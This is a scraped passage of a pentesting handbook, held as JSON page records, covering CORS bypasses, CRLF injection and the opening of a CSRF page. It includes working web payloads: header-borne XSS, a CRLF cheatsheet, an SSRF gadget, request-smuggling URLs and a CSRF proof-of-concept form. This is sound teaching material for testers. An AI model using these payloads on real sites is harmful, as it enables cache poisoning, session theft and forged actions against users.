check:\nhttps://www.corben.io/advanced-cors-techniques/\nand\nhttps://medium.com/bugbountywriteup/think-outside-the-scope-advanced-cors-exploitation-techniques-dad019c68397\n‚Äã\nFrom XSS inside a subdomain\nOne defensive mechanism developers use against CORS exploitation is to white-list domains that frequently requests access for information. However, this isn‚Äôt entirely secure, because if even\none\nof the subdomains of the\nwhitelisted\ndomain is\nvulnerable\nto other exploits such as\nXSS\n, it can enable CORS exploitation.\nLet us consider an example, the following code shows the configuration that allows subdomains of\nrequester.com\nto access resources of\nprovider.com\n.\nif\n(\n$_SERVER\n[\n'HTTP_HOST'\n]\n==\n'*.requester.com'\n)\n{\n//Access data\nelse\n{\n// unauthorized access}\n}\nAssuming that a user has access to sub.requester.com but not requester.com, and assuming that\nsub.requester.com\nis vulnerable to XSS. The user can exploit\nprovider.com\nby using cross-site scripting attack method.\nServer-side cache poisoning\nIf the stars are aligned we may be able to use server-side cache poisoning via HTTP header injection to create a\nstored XSS\nvulnerability.\nIf an application\nreflects\nthe\nOrigin header\nwithout even checking it for illegal characters like , we effectively have a\nHTTP header injection vulnerability against IE/Edge users as Internet Explorer and Edge view \\r (0x0d) as a valid HTTP header terminator\n:\nGET / HTTP/1.1\nOrigin: z[0x0d]Content-Type: text/html; charset=UTF-7\nInternet Explorer sees the response as:\nHTTP/1.1 200 OK\nAccess-Control-Allow-Origin: z\nContent-Type: text/html; charset=UTF-7\nThis isn't directly exploitable because there's no way for an attacker to make someone's web browser send such a malformed header, but I can\nmanually craft this request in Burp Suite and a server-side cache may save the response and serve it to other people\n. The payload I've used will change the page's character set to\nUTF-7\n, which is notoriously useful for creating XSS vulnerabilities.\nClient-Side cache poisoning\nYou may have occasionally encountered a page with\nreflected XSS\nin a custom HTTP header. Say a web page reflects the contents of a custom header without encoding:\nGET\n/\nHTTP/1.1\nHost\n:\nexample.com\nX-User-id\n:\n&lt;svg/onload=alert\\(1\\)&gt;\n‚Äã\nHTTP/1.1\n200\nOK\nAccess-Control-Allow-Origin\n:\n\\*\nAccess-Control-Allow-Headers\n:\nX-User-id\nContent-Type\n:\ntext/html\n...\nInvalid user: &lt;svg/onload=alert\\(1\\)&gt;\\\nWith CORS, we can send any value in the Header. By itself,\nthat's useless\nsince the response containing our\ninjected JavaScript won't be rendered\n. However,\nif Vary: Origin hasn't been specified\nthe response\nmay be stored in the browser's cache and displayed directly when the browser navigates to the associated URL\n. I've made a fiddle to\nattempt this attack on a URL of your choice\n. Since this attack uses client-side caching, it's actually quite reliable.\n<\nscript\n>\nfunction\ngotcha\n()\n{\nlocation\n=\nurl\n}\nvar\nreq\n=\nnew\nXMLHttpRequest\n();\nurl\n=\n'https://example.com/'\n;\n// beware of mixed content blocking when targeting HTTP sites\nreq\n.\nonload\n=\ngotcha\n;\nreq\n.\nopen\n(\n'get'\n,\nurl\n,\ntrue\n);\nreq\n.\nsetRequestHeader\n(\n\"X-Custom-Header\"\n,\n\"<svg/onload=alert(1)>\"\n)\nreq\n.\nsend\n();\n</\nscript\n>\nBypass\nXSSI (Cross-Site Script Inclusion) / JSONP\nXSSI designates a kind of vulnerability which exploits the fact that, when a resource is included using the\nscript\ntag, the SOP doesn‚Äôt apply, because scripts have to be able to be included cross-domain. An attacker can thus read everything that was included using the\nscript\ntag.\nThis is especially interesting when it comes to dynamic JavaScript or JSONP when so-called ambient-authority information like cookies are used for authentication. The cookies are included when requesting a resource from a different host. BurpSuite plugin:\nhttps://github.com/kapytein/jsonp\n‚Äã\n‚Äã\nRead more about the difefrent types of XSSI and how to exploit them here.\n‚Äã\nTry to add a\ncallback\nparameter\nin the request. Maybe the page was prepared to send the data as JSONP. In that case the page will send back the data with\nContent-Type: application/javascript\nwhich will bypass the CORS policy.\nEasy (useless?) bypass\nYou can ask a web-application to make a request for you and send back the response. This will bypass the\nAccess-Control-Allow-Origin\nbut notice that the\ncredentials to the final victim won't be sent\nas you will be\ncontacting a different domain\n(the one that will make the request for you).\n‚Äã\nCORS-escape\n‚Äã\nCORS-escape provides a\nproxy\nthat\npasses\non our\nrequest\nalong with its\nheaders\n, and it also\nspoofs\nthe\nOrigin\nheader (Origin =\nrequested domain\n). So the\nCORS policy is bypassed\n.\nThe source code is\non Github\n, so you can\nhost your own\n.\nxhr\n.\nopen\n(\n\"GET\"\n,\n\"https://cors-escape.herokuapp.com/https://maximum.blog/@shalvah/posts\"\n);\n‚Äã\nsimple-cors-escape\n‚Äã\nProxying is kinda like ‚Äúpassing on\" your request, exactly as you sent it. We could solve this in an alternative way that still involves someone else making the request for you, but this time,\ninstead of using passing on your request, the server makes its own request, but with whatever parameters you specified.\nIframe + Popup Bypass\nYou can\nbypass CORS checks\nsuch as\ne.origin === window.origin\nby\ncreating an iframe\nand\nfrom it opening a new window\n. More information in the following page:\nIframes in XSS, CSP and SOP\nDNS Rebinding via TTL\nBasically you make the\nvictim access your page\n, then you change the\nDNS of your domain (the IP)\nand make it\npoints\nto your\nvictims web page\n. You make your\nvictim execute\n(\nJS\n) something when the\nTTL is\nover\nso a new DNS request will be made and then you will be able to gather the information (as you will always maintains\nthe user in your domain\n, he won't send\nany cookie\nto the victim server, so this options\nabuses the special privileges of the IP of the victim\n).\nEven if you set the\nTTL very low\n(0 or 1)\nbrowsers have a cache\nthat will\nprevent\nyou from\nabusing\nthis for several seconds/minuted.\nSo, this technique is useful to\nbypass explicit checks\n(the victim is\nexplicitly performing a DNS request\nto check the IP of the domain and when the bot is called he will do his own).\nOr when you can have a\nuser/bot in the same page for a long time\n(so you can\nwait\nuntil the\ncache expires\n).\nIf you need something quick to abuse this you can use a service like\nhttps://lock.cmpxchg8b.com/rebinder.html\n.\nIf you want to run your own DNS rebinding server you can use something like\nDNSrebinder\n,\nthen\nexpose\nyour\nlocal port 53/udp\n, create an\nA registry pointing to it\n(ns.example.com), and create a\nNS registry\npointing to the\npreviously created A subdomain\n(ns.example.com).\nThen, any subdomain of that subdomain (ns.example.com), will be resolved by your host.\nCheck out also the\npublicly running server in\nhttp://rebind.it/singularity.html\n‚Äã\nDNS Rebinding via\nDNS Cache Flooding\nAs it was explained in the previous section,\nbrowsers\nhave the IPs of domains\ncached more time\nthan the one specified in the TTL. However, there is a way to bypass this defence.\nYou can have a service worker that will\nflood the DNS cache to force a second DNS request\n. SO the flow will be like:\n1.\nDNS request responded with attacker address\n2.\nService worker floods DNS cache (the cached attacker server name is deleted)\n3.\nSecond DNS request this time responded with 127.0.0.1\nBlue is the first DNS request and orange is the flood.\nDNS Rebinding via\nCache\nAs it was explained in the previous section,\nbrowsers\nhave the IPs of domains\ncached more time\nthan the one specified in the TTL. However, there is another way to bypass this defence.\nYou can\ncreate 2 A records\n(or\n1 with 2 IPs\n, depending on the provider) for the\nsame subdomain\nin the\nDNS provider\nand when a browser checks for them he will get both.\nNow, if the\nbrowser\ndecides to\nuse\nthe\nattacker IP address first\n, the\nattacker\nwill be able to\nserve\nthe\npayload\nthat will\nperform HTTP requests\nto the same\ndomain\n. However, now that the attacker knows the IP of the victim,\nhe will stop answering the victim browser\n.\nWhen the browser finds that the\ndomain isn't responding\nto him, it will\nuse the second given IP\n, so he will\naccess a different place bypassing SOP\n. The attacker can abuse that to\nget the information and exfiltrate it\n.\nNote that in order to access localhost you should try to rebind\n127.0.0.1\nin Windows and\n0.0.0.0\nin linux.\nProviders such as godaddy or cloudflare didn't allow me to use the ip 0.0.0.0, but AWS route53 allowed me to create one A record with 2 IPs being one of them \"0.0.0.0\"\n‚Äã\n‚Äã\nFor more info you can check\nhttps://unit42.paloaltonetworks.com/dns-rebinding/\n‚Äã\nOther Common Bypasses\nIf\ninternal IPs aren't allowed\n, they might\nforgot forbidding 0.0.0.0\n(works on Linux and Mac)\nIf\ninternal IPs aren't allowed\n, respond with a\nCNAME\nto\nlocalhost\n(works on Linux and Ma\nIf\ninternal IPs aren't allowed\nas DNS responses, you can respond\nCNAMEs to internal services\nsuch as www.corporate.internal.\nDNS Rebidding Weaponized\nYou can find more information about the previous bypass techniques and how to use the following tool in the talk\nGerald Doussot - State of DNS Rebinding Attacks & Singularity of Origin - DEF CON 27 Conference\n.\n‚Äã\nSingularity of Origin\nis a tool to perform\nDNS rebinding\nattacks. It includes the necessary components to rebind the IP address of the attack server DNS name to the target machine's IP address and to serve attack payloads to exploit vulnerable software on the target machine.\nReal Protection against DNS Rebinding\nUse TLS in internal services\nRequest authentication to access data\nValidate the Host header\n‚Äã\nhttps://wicg.github.io/private-network-access/\n: Proposal to always send a pre-flight request when public servers want to access internal servers\nTools\nFuzz possible misconfigurations in CORS policies\n‚Äã\nhttps://github.com/chenjj/CORScanner\n‚Äã\n‚Äã\nhttps://github.com/lc/theftfuzzer\n‚Äã\n‚Äã\nhttps://github.com/s0md3v/Corsy\n‚Äã\n‚Äã\nhttps://github.com/Shivangx01b/CorsMe\n‚Äã\nReferences\nWhat is CORS (cross-origin resource sharing)? Tutorial & Examples | Web Security Academy\nWebSecAcademy\nHTTP headers - HTTP | MDN\nExploiting CORS misconfigurations for Bitcoins and bounties\nPortSwigger Research\nWhat is CORS? | Codecademy\nCodecademy\n3 Ways You Can Exploit CORS Misconfigurations | we45\nwe45\nHacking It Out: When CORS won‚Äôt let you be great\nMedium\nPayloadsAllTheThings/CORS Misconfiguration at master ¬∑ swisskyrepo/PayloadsAllTheThings\nGitHub\nEvery Bug Bounty hunter should know the evil smile of the JSONP over the browser‚Äôs Same Origin‚Ä¶\nMedium\n‚Äã\n‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è\n-\nüê¶ Twitter üê¶\n-\nüéôÔ∏è Twitch üéôÔ∏è\n-\nüé• Youtube üé•\n‚Äã\nDo you work in a\ncybersecurity company\n? Do you want to see your\ncompany advertised in HackTricks\n? or do you want to have access to the\nlatest version of the PEASS or download HackTricks in PDF\n? Check the\nSUBSCRIPTION PLANS\n!\nDiscover\nThe PEASS Family\n, our collection of exclusive\nNFTs\n‚Äã\nGet the\nofficial PEASS & HackTricks swag\n‚Äã\nJoin the\nüí¨\nDiscord group\nor the\ntelegram group\nor\nfollow\nme on\nTwitter\nüê¶\n‚Äã\n@carlospolopm\n.\nShare your hacking tricks by submitting PRs to the\nhacktricks repo\nand\nhacktricks-cloud repo\n.\nPrevious\nCookie Bomb\nNext\n- Pentesting Web\nCRLF (%0D%0A) Injection\nLast modified\n6mo ago"
    },
    {
        "title": "CRLF (%0D%0A) Injection",
        "url": "https://book.hacktricks.xyz/pentesting-web/crlf-0d-0a",
        "text": "CRLF (%0D%0A) Injection\n‚Äã\n‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è\n-\nüê¶ Twitter üê¶\n-\nüéôÔ∏è Twitch üéôÔ∏è\n-\nüé• Youtube üé•\n‚Äã\nDo you work in a\ncybersecurity company\n? Do you want to see your\ncompany advertised in HackTricks\n? or do you want to have access to the\nlatest version of the PEASS or download HackTricks in PDF\n? Check the\nSUBSCRIPTION PLANS\n!\nDiscover\nThe PEASS Family\n, our collection of exclusive\nNFTs\n‚Äã\nGet the\nofficial PEASS & HackTricks swag\n‚Äã\nJoin the\nüí¨\nDiscord group\nor the\ntelegram group\nor\nfollow\nme on\nTwitter\nüê¶\n‚Äã\n@carlospolopm\n.\nShare your hacking tricks by submitting PRs to the\nhacktricks repo\nand\nhacktricks-cloud repo\n.\n‚Äã\n‚Äã\nIf you are interested in\nhacking career\nand hack the unhackable -\nwe are hiring!\n(\nfluent polish written and spoken required\n).\nCareers | stmcyber.com | penetration testing\nstmcyber.com\nWhat is CRLF?\nWhen a browser sends a request to a web server, the web server answers back with a response containing both the HTTP response headers and the actual website content, i.e. the response body. The HTTP headers and the HTML response (the website content) are separated by a specific combination of special characters, namely a carriage return and a line feed. For short they are also known as CRLF.\nThe web server uses the CRLF to understand when new HTTP header begins and another one ends. The CRLF can also tell a web application or user that a new line begins in a file or in a text block. The CRLF characters are a standard HTTP/1.1 message, so it is used by any type of web server, including Apache, Microsoft IIS and all others.\nFrom\nhttps://www.netsparker.com/blog/web-security/crlf-http-header/#\n‚Äã\nWhat is the CRLF Injection Vulnerability?\nIn a CRLF injection vulnerability attack the attacker inserts both the carriage return and linefeed characters into user input to trick the server, the web application or the user into thinking that an object is terminated and another one has started. As such the CRLF sequences are not malicious characters, however they can be used for malicious intend, for HTTP response splitting etc.\nCRLF injection in web applications\nIn web applications a CRLF injection can have severe impacts, depending on what the application does with single items. Impacts can range from information disclosure to code execution, a direct impact web application security vulnerability. In fact a CRLF injection attack can have very serious repercussions on a web application, even though it was never listed in the OWASP Top 10 list. For example it is also possible to manipulate log files in an admin panel as explained in the below example.\nAn example of CRLF Injection in a log file\nImagine a log file in an admin panel with the output stream pattern of IP - Time - Visited Path, such as the below:\n123.123.123.123 - 08:15 - /index.php?page=home\nIf an attacker is able to inject the CRLF characters into the HTTP request he is able to change the output stream and fake the log entries. He can change the response from the webs application to something like the below:\n/index.php?page=home&%0d%0a127.0.0.1 - 08:15 - /index.php?page=home&restrictedaction=edit\nThe %0d and %0a are the url encoded forms of CR and LF. Therefore the log entries would look like this after the attacker inserted those characters and the application displays it:\nIP - Time - Visited Path\n123.123.123.123 - 08:15 - /index.php?page=home&\n127.0.0.1 - 08:15 - /index.php?page=home&restrictedaction=edit\nTherefore by exploiting a CRLF injection vulnerability the attacker can fake entries in the log file to obfuscate his own malicious actions. The attacker is literally doing page hijacking and modifying the response. For example imagine a scenario where the attacker has the admin password and executed the restrictedaction parameter, which can only be used by an admin.\nThe problem is that if the administrator notices that an unknown IP used the restrictedaction parameter, will notice that something is wrong. However, since now it looks like the command was issued by the localhost (and therefore probably by someone who has access to the server, like an admin) it does not look suspicious.\nThe whole part of the query beginning with %0d%0a will be handled by the server as one parameter. After that there is another & with the parameter restricted action which will be parsed by the server as another parameter. Effectively this would be the same query as:\n/index.php?page=home&restrictedaction=edit\nHTTP Response Splitting\nDescription\nSince the header of a HTTP response and its body are separated by CRLF characters an attacker can try to inject those. A combination of CRLFCRLF will tell the browser that the header ends and the body begins. That means that he is now able to write data inside the response body where the html code is stored. This can lead to a Cross-site Scripting vulnerability.\nAn example of HTTP Response Splitting leading to XSS\nImagine an application that sets a custom header, for example:\nX-Your-Name: Bob\nThe value of the header is set via a get parameter called \"name\". If no URL encoding is in place and the value is directly reflected inside the header it might be possible for an attacker to insert the above mentioned combination of CRLFCRLF to tell the browser that the request body begins. That way he is able to insert data such as XSS payload, for example:\n?name=Bob%0d%0a%0d%0a<script>alert(document.domain)</script>\nThe above will display an alert window in the context of the attacked domain.\nAn example of HTTP Response Splitting leading to Redirect\n#BugBounty ‚Äî Exploiting CRLF Injection can lands into a nice bounty\nMedium\nBrowser to:\n/%0d%0aLocation:%20http://myweb.com\nAnd the server responses with the header:\nLocation: http://myweb.com\nOther example: (from\nhttps://www.acunetix.com/websitesecurity/crlf-injection/\n)\nhttp://www.example.com/somepage.php?page=%0d%0aContent-Length:%200%0d%0a%0d%0aHTTP/1.1%20200%20OK%0d%0aContent-Type:%20text/html%0d%0aContent-Length:%2025%0d%0a%0d%0a%3Cscript%3Ealert(1)%3C/script%3E\nIn URL Path\nYou can send the payload\ninside the URL path\nto control the\nresponse\nfrom the server:\nhttp://stagecafrstore.starbucks.com/%3f%0d%0aLocation:%0d%0aContent-Type:text/html%0d%0aX-XSS-Protection%3a0%0d%0a%0d%0a%3Cscript%3Ealert%28document.domain%29%3C/script%3E\nhttp://stagecafrstore.starbucks.com/%3f%0D%0ALocation://x:1%0D%0AContent-Type:text/html%0D%0AX-XSS-Protection%3a0%0D%0A%0D%0A%3Cscript%3Ealert(document.domain)%3C/script%3E\nbugbounty-cheatsheet/crlf.md at master ¬∑ EdOverflow/bugbounty-cheatsheet\nGitHub\nHTTP Header Injection\nDescription\nBy exploiting a CRLF injection an attacker can also insert HTTP headers which could be used to defeat security mechanisms such as a browser's XSS filter or the same-origin-policy. This allows the attacker to gain sensitive information like CSRF tokens. He can also set cookies which could be exploited by logging the victim in the attacker's account or by exploiting otherwise unexploitable\ncross-site scripting (XSS) vulnerabilities\n.\nAn example of HTTP Header Injection to extract sensitive data\nIf an attacker is able to inject the HTTP headers that activate CORS (Cross Origin Resource Sharing), he can use javascript to access resources that are otherwise protected by SOP (Same Origin Policy) which prevents sites from different origins to access each other.\nNew HTTP request in SSRF\nAbusing CRLF injection you can\ncraft a new HTTP request and inject it\n.\nA good example can be done using the\nSoapClient\ndeserialization gadget from in PHP. This class is\nvulnerable to CRLF\ninside the\nuser_agent\nparameter allowing to i\nnsert new headers and body content\n. However, you can even be able to abuse this vulnerability to\ninject a new HTTP request:\n$target\n=\n'http://127.0.0.1:9090/test'\n;\n$post_string\n=\n'variable=post value'\n;\n$crlf\n=\narray\n(\n'POST /proxy HTTP/1.1'\n,\n'Host: local.host.htb'\n,\n'Cookie: PHPSESSID=[PHPSESSID]'\n,\n'Content-Type: application/x-www-form-urlencoded'\n,\n'Content-Length: '\n.\n(\nstring\n)\nstrlen\n(\n$post_string\n),\n\"\\r\\n\"\n,\n$post_string\n);\n‚Äã\n$client\n=\nnew\nSoapClient\n(\nnull\n,\narray\n(\n'uri'\n=>\n$target\n,\n'location'\n=>\n$target\n,\n'user_agent'\n=>\n\"IGN\\r\\n\\r\\n\"\n.\njoin\n(\n\"\\r\\n\"\n,\n$crlf\n)\n)\n);\n‚Äã\n#Put a nc listening in port 9090\n$client\n->\n__soapCall\n(\n\"test\"\n,\n[]);\nHeader Injection to Request Smuggling\nYou can inject essential headers to ensure the\nback-end keeps the connection open\nafter responding to the initial request:\nGET /%20HTTP/1.1%0d%0aHost:%20redacted.net%0d%0aConnection:%20keep-alive%0d%0a%0d%0a HTTP/1.1\nThen,\nspecify a second request\n. Here you have a\nclassic\nrequest smuggling\n**** with\nextra\nheaders/body\nappended by the server after the injection.\nHere's two of the many options for cross-user exploitation.\nSpecifying a\nmalicious prefix\nto poison either the next user's request, or a web cache:\nGET /%20HTTP/1.1%0d%0aHost:%20redacted.net%0d%0aConnection:%20keep-alive%0d%0a%0d%0aGET%20/redirplz%20HTTP/1.1%0d%0aHost:%20oastify.com%0d%0a%0d%0aContent-Length:%2050%0d%0a%0d%0a HTTP/1.1\nOr crafting our prefix to combine with the trailing junk and create a complete second request in order to trigger\nresponse queue poisoning\n.\nGET /%20HTTP/1.1%0d%0aHost:%20redacted.net%0d%0aConnection:%20keep-alive%0d%0a%0d%0aGET%20/%20HTTP/1.1%0d%0aFoo:%20bar HTTP/1.1\nFor more info about this technique and potential problems\ncheck the original source\n.\nMemcache Injection\nMemcache is a\nkey-value store that uses a clear text protocol\n. More info in:\n11211 - Pentesting Memcache\nIf a plarform is taking\ndata from an HTTP request and using it without sanitizing\nit to perform\nrequests\nto a\nmemcache\nserver, an attacker could abuse this behaviour to\ninject new memcache commands\n.\nFor example, in the original discovered vuln, cache keys were used to return the IP and port a user shuold connect to, and attackers were able to\ninject memcache comands\nthat would\npoison\nthe\ncache to send the vistims details\n(usrnames and passwords included) to the attacker servers:\nMoreover, researchers also discovered that they could desync the memcache responses to send the attackers ip and ports to users whose email the attacker didn't know:\nFor the full information read the\noriginal writeup\n****\nImpacts of the CRLF injection Vulnerability\nThe impact of CRLF injections vary and also include all the impacts of Cross-site Scripting to information disclosure. It can also deactivate certain security restrictions like XSS Filters and the Same Origin Policy in the victim's browsers, leaving them susceptible to malicious attacks.\nHow to Prevent CRLF / HTTP Header Injections in Web Applications\nThe best prevention technique is to not use users input directly inside response headers. If that is not possible, you should always use a function to encode the CRLF special characters. Another good web application security best practise is to update your programming language to a version that does not allow CR and LF to be injected inside functions that set HTTP headers.\nCHEATSHEET\n1. HTTP Response Splitting\n‚Ä¢ /%0D%0ASet-Cookie:mycookie=myvalue (Check if the response is setting this cookie)\n‚Äã\n2. CRLF chained with Open Redirect\n‚Ä¢ //www.google.com/%2F%2E%2E%0D%0AHeader-Test:test2\n‚Ä¢ /www.google.com/%2E%2E%2F%0D%0AHeader-Test:test2\n‚Ä¢ /google.com/%2F..%0D%0AHeader-Test:test2\n‚Ä¢ /%0d%0aLocation:%20http://example.com\n‚Äã\n3. CRLF Injection to XSS\n‚Ä¢ /%0d%0aContent-Length:35%0d%0aX-XSS-Protection:0%0d%0a%0d%0a23\n‚Ä¢ /%3f%0d%0aLocation:%0d%0aContent-Type:text/html%0d%0aX-XSS-Protection%3a0%0d%0a%0d%0a%3Cscript%3Ealert%28document.domain%29%3C/script%3E\n‚Äã\n4. Filter Bypass\n‚Ä¢ %E5%98%8A = %0A = \\u560a\n‚Ä¢ %E5%98%8D = %0D = \\u560d\n‚Ä¢ %E5%98%BE = %3E = \\u563e (>)\n‚Ä¢ %E5%98%BC = %3C = \\u563c (<)\n‚Ä¢ Payload = %E5%98%8A%E5%98%8DSet-Cookie:%20test\nTool\nGitHub - dwisiswant0/crlfuzz: A fast tool to scan CRLF vulnerability written in Go\nGitHub\nBrute-Force Detection List\nAuto_Wordlists/crlf.txt at main ¬∑ carlospolop/Auto_Wordlists\nGitHub\nReferences\n‚Äã\nhttps://www.acunetix.com/websitesecurity/crlf-injection/\n‚Äã\n‚Äã\nhttps://portswigger.net/research/making-http-header-injection-critical-via-response-queue-poisoning\n‚Äã\n‚Äã\n‚Äã\nIf you are interested in\nhacking career\nand hack the unhackable -\nwe are hiring!\n(\nfluent polish written and spoken required\n).\nCareers | stmcyber.com | penetration testing\nstmcyber.com\n‚Äã\n‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è\n-\nüê¶ Twitter üê¶\n-\nüéôÔ∏è Twitch üéôÔ∏è\n-\nüé• Youtube üé•\n‚Äã\nDo you work in a\ncybersecurity company\n? Do you want to see your\ncompany advertised in HackTricks\n? or do you want to have access to the\nlatest version of the PEASS or download HackTricks in PDF\n? Check the\nSUBSCRIPTION PLANS\n!\nDiscover\nThe PEASS Family\n, our collection of exclusive\nNFTs\n‚Äã\nGet the\nofficial PEASS & HackTricks swag\n‚Äã\nJoin the\nüí¨\nDiscord group\nor the\ntelegram group\nor\nfollow\nme on\nTwitter\nüê¶\n‚Äã\n@carlospolopm\n.\nShare your hacking tricks by submitting PRs to the\nhacktricks repo\nand\nhacktricks-cloud repo\n.\nPentesting Web -\nPrevious\nCORS - Misconfigurations & Bypass\nNext\n- Pentesting Web\nCSRF (Cross Site Request Forgery)\nLast modified\n5mo ago"
    },
    {
        "title": "CSRF (Cross Site Request Forgery)",
        "url": "https://book.hacktricks.xyz/pentesting-web/csrf-cross-site-request-forgery",
        "text": "CSRF (Cross Site Request Forgery)\n‚Äã\n‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è\n-\nüê¶ Twitter üê¶\n-\nüéôÔ∏è Twitch üéôÔ∏è\n-\nüé• Youtube üé•\n‚Äã\nDo you work in a\ncybersecurity company\n? Do you want to see your\ncompany advertised in HackTricks\n? or do you want to have access to the\nlatest version of the PEASS or download HackTricks in PDF\n? Check the\nSUBSCRIPTION PLANS\n!\nDiscover\nThe PEASS Family\n, our collection of exclusive\nNFTs\n‚Äã\nGet the\nofficial PEASS & HackTricks swag\n‚Äã\nJoin the\nüí¨\nDiscord group\nor the\ntelegram group\nor\nfollow\nme on\nTwitter\nüê¶\n‚Äã\n@carlospolopm\n.\nShare your hacking tricks by submitting PRs to the\nhacktricks repo\nand\nhacktricks-cloud repo\n.\nHackenProof is home to all crypto bug bounties.\nGet rewarded without delays\nHackenProof bounties launch only when their customers deposit the reward budget. You'll get the reward after the bug is verified.\nGet experience in web3 pentesting\nBlockchain protocols and smart contracts are the new Internet! Master web3 security at its rising days.\nBecome the web3 hacker legend\nGain reputation points with each verified bug and conquer the top of the weekly leaderboard.\n‚Äã\nSign up on HackenProof\nstart earning from your hacks!\nHackenProof\nWhat is CSRF?\nCross-site request forger\ny (also known as CSRF) is a web security vulnerability that allows an attacker to\ninduce users to perform actions that they do not intend to perform\n.\nThis is done by\nmaking a logged in user\nin the victim platform access an attacker controlled website and from there\nexecute\nmalicious JS code, send forms or retrieve \"images\" to the\nvictims account\n.\nRequisites\nIn order to be able to abuse a CSRF vulnerability you first need to\nfind a relevant action to abuse\n(change password or email, make the victim follow you on a social network, give you more privileges...). The\nsession must rely only on cookies or HTTP Basic Authentication header\n, any other header can't be used to handle the session. An finally, there\nshouldn't be unpredictable parameters\non the request.\nSeveral\ncounter-measures\ncould be in place to avoid this vulnerability.\nCommon defenses\n‚Äã\nSameSite cookies\n: If the session cookie is using this flag, you may not be able to send the cookie from arbitrary web sites.\n‚Äã\nCross-origin resource sharing\n: Depending on which kind of HTTP request you need to perform to abuse the relevant action, you may take int account the\nCORS policy of the victim site\n.\nNote that the CORS policy won't affect if you just want to send a GET request or a POST request from a form and you don't need to read the response.\nAsk for the\npassword\nuser to authorise the action.\nResolve a\ncaptcha\nRead the\nReferrer\nor\nOrigin\nheaders. If a regex is used it could be bypassed form example with:\nhttp://mal.net?orig=http://example.com (ends with the url)\nhttp://example.com.mal.net (starts with the url)\nModify\nthe\nname\nof the\nparameters\nof the Post or Get request\nUse a\nCSRF token\nin each session. This token has to be send inside the request to confirm the action. This token could be protected with CORS.\nCSRF map\nDefences Bypass\nFrom POST to GET\nMaybe the form you want to abuse is prepared to send a\nPOST request with a CSRF token but\n, you should\ncheck\nif a\nGET\nis also\nvalid\nand if when you send a GET request the\nCSRF token is still being validated\n.\nLack of token\nSome applications correctly\nvalidate the token when it is present but skip the validation if the token is omitted\n.\nIn this situation, the attacker can\nremove the entire parameter\ncontaining the token (not just its value) to bypass the validation and deliver a CSRF attack.\nCSRF token is not tied to the user session\nSome applications do\nnot validate that the token belongs to the same session\nas the user who is making the request. Instead, the application\nmaintains a global pool of tokens\nthat it has issued and accepts any token that appears in this pool.\nIn this situation, the attacker can log in to the application using their own account,\nobtain a valid token\n, and then\nfeed that token to the victim\nuser in their CSRF attack.\nMethod bypass\nIf the request is using a \"\nweird\n\"\nmethod\n, check if the\nmethod\noverride functionality\nis working.\nFor example, if it's\nusing a PUT\nmethod you can try to\nuse a POST\nmethod and\nsend\n:\nhttps://example.com/my/dear/api/val/num?\n_method=PUT\nThis could also works sending the\n_method parameter inside the a POST request\nor using the\nheaders\n:\nX-HTTP-Method\nX-HTTP-Method-Override\nX-Method-Override\nCustom header token bypass\nIf the request is adding a\ncustom header\nwith a\ntoken\nto the request as\nCSRF protection method\n, then:\nTest the request without the\nCustomized Token and also header.\nTest the request with exact\nsame length but different token\n.\nCSRF token is verified by a cookie\nIn a further variation on the preceding vulnerability, some applications\nduplicate each token within a cookie and a request parameter\n. Or the\nset a csrf cookie\nand the\nchecks in the backend if the csrf token sent is the one related with the cookie\n.\nWhen the subsequent request is validated, the application simply verifies that the\ntoken\nsubmitted in the\nrequest parameter matches\nthe value stored by the\ncookie\n.\nIn this situation, the attacker can again perform a CSRF\nattack if the web site contains any vulnerability what would allow him to set his CSRF cookie to the victim like a CRLF\n.\nIn this case you can set the cookie trying to load a fake image and then launch the CSRF attack like in this example:\n<\nhtml\n>\n<!-- CSRF PoC - generated by Burp Suite Professional -->\n<\nbody\n>\n<\nscript\n>\nhistory\n.\npushState\n(\n''\n,\n''\n,\n'/'\n)\n</\nscript\n>\n<\nform\naction\n=\n\"\nhttps://ac4e1f591f895b02c0ee1ee3001800d4.web-security-academy.net/my-account/change-email\n\"\nmethod\n=\n\"\nPOST\n\"\n>\n<\ninput\ntype\n=\n\"\nhidden\n\"\nname\n=\n\"\nemail\n\"\nvalue\n=\n\"\nasd\n&#64;\nasd\n&#46;\nasd\n\"\n/>\n<\ninput\ntype\n=\n\"\nhidden\n\"\nname\n=\n\"\ncsrf\n\"\nvalue\n=\n\"\ntZqZzQ1tiPj8KFnO4FOAawq7UsYzDk8E\n\"\n/>\n<\ninput\ntype\n=\n\"\nsubmit\n\"\nvalue\n=\n\"\nSubmit request\n\"\n/>\n</\nform\n>\n<\nimg\nsrc\n=\n\"\nhttps://ac4e1f591f895b02c0ee1ee3001800d4.web-security-academy.net/?search=term%0d%0aSet-Cookie:%20csrf=tZqZzQ1tiPj8KFnO4FOAawq7UsYzDk8E\n\"\nonerror\n=\n\"\ndocument\n.\nforms\n[\n0\n].\nsubmit\n();\n\"\n/>\n</\nbody\n>\n</\nhtml\n>\nNote that if the\ncsrf token is related with the session cookie this attack won't work\nbecause you will need to set the victim your session, and therefore you will be attacking yourself.\nContent-Type change\nAccording to\nthis\n, in order to\navoid preflight\nrequests using\nPOST\nmethod these are the allowed Content-Type values:\napplication/x-www-form-urlencoded\nmultipart/form-data\ntext/plain\nHowever, note that the\nsevers logic may vary\ndepending on the\nContent-Type\nused so you should try the values mentioned and others like\napplication/json\n,\ntext/xml\n,\napplication/xml\n.\nExample (from\nhere\n) of sending JSON data as text/plain:\n<\nhtml\n>\n<\nbody\n>\n<\nform\nid\n=\n\"\nform\n\"\nmethod\n=\n\"\npost\n\"\naction\n=\n\"\nhttps://phpme.be.ax/\n\"\nenctype\n=\n\"\ntext/plain\n\"\n>\n<\ninput\nname\n=\n'\n{\"garbageeeee\":\"\n'\nvalue\n=\n'\"\n, \"yep\": \"yep yep yep\", \"url\": \"https://webhook/\"}\n'\n>\n</\nform\n>\n<\nscript\n>\nform\n.\nsubmit\n();\n</\nscript\n>\n</\nbody\n>\n</\nhtml\n>\napplication/json preflight request bypass\nAs you already know, you cannot sent a POST request with the Content-Type\napplication/json\nvia HTML form, and if you try to do so via\nXMLHttpRequest\na\npreflight\nrequest is sent first.\nHowever, you could try to send the JSON data using the content types **\ntext/plain\nand\napplication/x-www-form-urlencoded\n** just to check if the backend is using the data independently of the Content-Type.\nYou can send a form using\nContent-Type: text/plain\nsetting\nenctype=\"text/plain\"\nIf the server is only accepting the content type \"application/json\", you can\nsend the content type \"text/plain; 